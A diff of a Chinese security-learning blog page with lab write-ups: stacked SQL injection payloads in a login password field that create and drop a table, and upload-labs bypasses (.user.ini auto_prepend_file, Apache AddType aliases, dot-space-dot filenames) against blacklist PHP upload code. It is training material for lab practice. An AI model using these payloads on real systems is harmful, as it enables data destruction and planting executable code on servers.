+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username :  admin</span><br><span class="line"></span><br><span class="line">password :  c&#x27;);create table less45 like users#   //创建了less45表</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看增加表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less45|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>登录前测试删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username： admin</span><br><span class="line"></span><br><span class="line">password ： c&#x27;);drop table less45#</span><br></pre></td></tr></table></figure>
+
+<p>登录后查看删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" data-id="cmawal1jc0029bo7kbgrzg2ci" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/user.ini" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);  <span class="comment">//分割文件名通过.来分割</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现.htaccess也被加入黑名单，所以我们要想其他方法，.user.ini绕过</p>
+<h1 id="user-ini文件写法"><a href="#user-ini文件写法" class="headerlink" title=".user.ini文件写法"></a>.user.ini文件写法</h1><blockquote>
+<p>auto_prepend_file&#x3D;1.jpg   &#x2F;&#x2F;目录下面所有PHP文件都会预先加载1.jpg文件下的内容</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><h2 id="点加空格加点"><a href="#点加空格加点" class="headerlink" title="点加空格加点"></a>点加空格加点</h2><p>因为源码并未循环，只过滤了一遍，所以有漏洞可钻,  1.php. .</p>
+<blockquote>
+<p>file_name会变成1.php，然后file_ext读取的是.</p>
+</blockquote>
+<p>由于windows下后缀的.和空格都会自动被删除，所以我们通过burpsuite更改后缀</p>
+<p>很遗憾BUUCFT的源码不一样，但是我自己搭建的靶场也提交错误，所以只能使用大小写绕过，因为在系统下后缀改成大小写会被自动解析成为小写的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" data-id="cmawal1je002ebo7k176lbirg" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/别名攻击" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="别名攻击"><a href="#别名攻击" class="headerlink" title="别名攻击"></a>别名攻击</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;        </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>只提出了黑名单，可以使用别名攻击</p>
+<p>但是改成php3测试连接返回未空，而且会提示你下载一些东西，说明服务器并没将php3当作php来解析</p>
+<p>所以我没要找到服务器Apache的配置文件httpd.conf然后找到AddType,找到<kbd>#AddType application/x-httpd-php  .php</kbd>​这一句，意思是以什么结尾的服务器会以php认可</p>
+</blockquote>
+<p><img src="/.com//image-20250119180334-7khsgt2.png" alt="image"></p>
+<blockquote>
+<p>添加多一些后缀，也就可以实现别名攻击,还有可能和php版本有问题</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" data-id="cmawal1je002fbo7k7viher5t" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/空格点绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="空格点绕过"><a href="#空格点绕过" class="headerlink" title="空格点绕过"></a>空格点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可以用点空格点来绕过，<kbd>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</kbd>​因为加载的是文件名字，检测的是文件后缀</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87/" data-id="cmawal1jg002nbo7k5hnb52cw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
     </footer>
   </div>
   
@@ -362,6 +838,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -371,7 +852,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B/">实战案例</a></li></ul></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
     </div>
   </div>
 
@@ -381,7 +862,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" rel="tag">跨站请求伪造</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li 